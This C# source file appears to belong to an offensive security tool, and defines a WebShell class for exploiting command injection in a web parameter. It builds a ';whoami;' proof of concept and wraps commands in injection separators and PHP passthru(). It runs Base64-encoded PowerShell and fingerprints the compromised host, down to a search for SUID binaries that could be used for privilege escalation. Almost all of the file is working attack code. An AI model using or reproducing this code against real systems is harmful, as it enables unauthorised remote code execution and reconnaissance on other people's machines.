using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Service;
using Service.Exploit;

namespace Machine
{
    public enum ShellType
    {
        Linux,
        Windows,
        Php,
        None
    }
    
    public class WebShell
    {
        private static ShellType IdentifyShell()
        {
            throw new NotImplementedException();
        }
        
        private bool _interactive;
        private ShellType _shellType;
        private InputWebService _entry;

        private bool _isUpgraded;
        
        public WebShell(InputWebService entry, ShellType shellType, bool interactive)
        {
            _entry = entry;
            _shellType = shellType;
            _interactive = interactive;

            Task<bool> task = Task.Run(async () => await IsActive());
            task.Wait();

            if (!task.Result)
            {
                throw new ArgumentException("Entry is not a valid entry point.");
            }

            string poc = $"{entry.GetUrl()}?{entry.GetParam()}=1;whoami;";
            
            AccessPoint accessPoint = new AccessPoint(entry.GetUrl(), poc, AccessPointType.RCE, 10);
            entry.Log(accessPoint);
            
            entry.GetHost().AddShell(this);
        }

        public string PreProcessCommand(string command)
        {

            string preCommand = "";
            string postCommand = "";
            if (_shellType == ShellType.Linux || _shellType == ShellType.Windows)
            {
                preCommand = "1 & echo \"SECUStudioDEBUT\" && ";
                postCommand = " && echo \"SECUStudioFIN\"";
            }

            if (_isUpgraded)
            {
                preCommand = ";passthru(" + preCommand;
                postCommand += ");";
            }

            // We base64 encode the command to correctly escape quotes etc. without hassle.
            if (_shellType == ShellType.Windows)
            {
                byte[] bytes = Encoding.Unicode.GetBytes(command);
                command = Convert.ToBase64String(bytes, Base64FormattingOptions.None);
                preCommand = preCommand + "powershell -EncodedCommand ";
            }

            return preCommand + command + postCommand;
        }

        public void Upgrade()
        {
            if (_shellType == ShellType.Php)
            {
                _isUpgraded = true;
            }
        }
        
        public async Task<string> SendCommand(string cmd)
        {
            cmd = PreProcessCommand(cmd);
            string result = await _entry.Submit(cmd);
            
            Regex filter = new Regex("(?<!echo \")(?>SECUStudioDEBUT\"?)(?<result>.*?)(?<!echo \")(?>\"?SECUStudioFIN)",
                RegexOptions.Singleline // SingleLine is an option telling Regex to treat newline as an ordinary characters (usually Regex matches are separated by newlines) 
            );
            
            result = filter.Match(result).Groups["result"].Value;
            return result;
        }

        public async Task<bool> IsActive()
        {
            const string needle = "SECU";
            return (await SendCommand($"echo \"{needle}\"")).Contains(needle);
        }

        /// <summary>
        /// Return a fingerprint of the Machine. Basically containing some useful information about the Machine.
        /// </summary>
        /// <returns>An MachineInfo object ready to be serialized, or used.</returns>
        public async Task<MachineInfo> AsyncCreateFingerprint()
        {
            OsType osType;
            string VersionNumber;
            List<string> installedPrograms = new List<string>();
            List<string> SuidPrograms = new List<string>();
            switch (_shellType)
            {
                case ShellType.Linux:
                    osType = OsType.Linux;
                    break;
                case ShellType.Windows:
                    osType = OsType.Windows;
                    break;
                default:
                    osType = OsType.Unknown;
                    break;
            }

            switch (osType)
            {
                case OsType.Windows:
                    VersionNumber = await SendCommand("systeminfo |findstr \"Version\"|findstr \"build\"");
                    installedPrograms = 
                        (await SendCommand(@"(dir 'C:\Program Files\') -Split '\n'"))
                        .Split(new[] {'\n', '\r'}, StringSplitOptions.RemoveEmptyEntries).ToList();
                    installedPrograms.AddRange(
                        (await SendCommand(@"(dir 'C:\Program Files (x86)\') -Split '\n'"))
                        .Split(new[] {'\n', '\r'}, StringSplitOptions.RemoveEmptyEntries)
                        );
                    break;
                case OsType.Linux:
                case OsType.Darwin:
                    VersionNumber = await SendCommand("uname -a");
                    installedPrograms =
                        (await SendCommand("ls -1 /bin"))
                        .Split(new[] {'\n', '\r'}, StringSplitOptions.RemoveEmptyEntries).ToList();
                    installedPrograms.AddRange(
                        (await SendCommand("ls -1 /usr/bin"))
                        .Split(new[] {'\n', '\r'}, StringSplitOptions.RemoveEmptyEntries)
                    );
                    
                    SuidPrograms =
                        (await SendCommand("find /usr/bin/ /bin/ -perm /4000 -ls"))
                        .Split(new[] {'\n', '\r'}, StringSplitOptions.RemoveEmptyEntries).ToList();
                    break;
                default:
                    VersionNumber = "Unknown";
                    break;
            }
            
            return new MachineInfo(osType, VersionNumber, installedPrograms, SuidPrograms);
        }

        private async Task AsyncLogFingerprint(MachineInfo machineInfo)
        {
            string path = Path.Combine(_entry.GetHost().WorkingDirectory, "fingerprint.json");
            
            if (File.Exists(path))
                File.Delete(path);
            
            string jsonSerializedObj = JsonConvert.SerializeObject(machineInfo, Formatting.Indented);
            byte[] toWrite = new UTF8Encoding(true).GetBytes(jsonSerializedObj);
            
            FileStream fs = new FileStream(path, FileMode.OpenOrCreate);
            
            await fs.WriteAsync(toWrite, 0, toWrite.Length);
            fs.Close();
        }

        public async Task AsyncLogFingerprint()
        {
            await AsyncLogFingerprint(await AsyncCreateFingerprint());
        }
    }
}